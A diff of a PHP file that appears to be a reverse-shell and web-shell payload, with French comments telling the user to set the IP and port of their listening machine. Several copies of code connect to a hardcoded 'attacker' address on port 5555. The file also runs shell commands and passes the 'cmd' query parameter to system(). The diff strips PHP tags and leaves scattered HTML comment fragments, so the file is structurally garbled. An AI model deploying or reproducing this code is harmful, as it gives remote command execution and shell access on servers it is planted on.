@@ -1,4 +1,4 @@
-<?php
+
 // Remplacez l'adresse IP et le port par ceux de votre machine d'écoute.
 $ip = '84.6.222.90'; // Adresse IP de l'attaquant
 $port = 5555;          // Port d'écoute
@@ -13,10 +13,7 @@ if ($sock) {
 } else {
     die('Impossible de se connecter au serveur.');
 }
-?>
-
---> echo "ez";
-<?php
+-->
 // Remplacez l'adresse IP et le port par ceux de votre machine d'écoute.
 $ip = '84.6.222.90'; // Adresse IP de l'attaquant
 $port = 5555;          // Port d'écoute
@@ -31,15 +28,13 @@ if ($sock) {
 } else {
     die('Impossible de se connecter au serveur.');
 }
-?>
---> <?php
+-->
 echo exec("ls -la");
 echo shell_exec("ls -la");
 system("whoami");
 system($_GET['cmd']);
 print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
-?> <!--<?php
-// Remplacez l'adresse IP et le port par ceux de votre machine d'écoute.
+ <!--
 $ip = '84.6.222.90'; // Adresse IP de l'attaquant
 $port = 5555;          // Port d'écoute
 
@@ -55,7 +50,6 @@ if ($sock) {
 }
 ?>
 <!--
-<?php
 // Remplacez l'adresse IP et le port par ceux de votre machine d'écoute.
 $ip = '84.6.222.90'; // Adresse IP de l'attaquant
 $port = 5555;          // Port d'écoute
@@ -70,4 +64,3 @@ if ($sock) {
 } else {
     die('Impossible de se connecter au serveur.');
 }
-?>
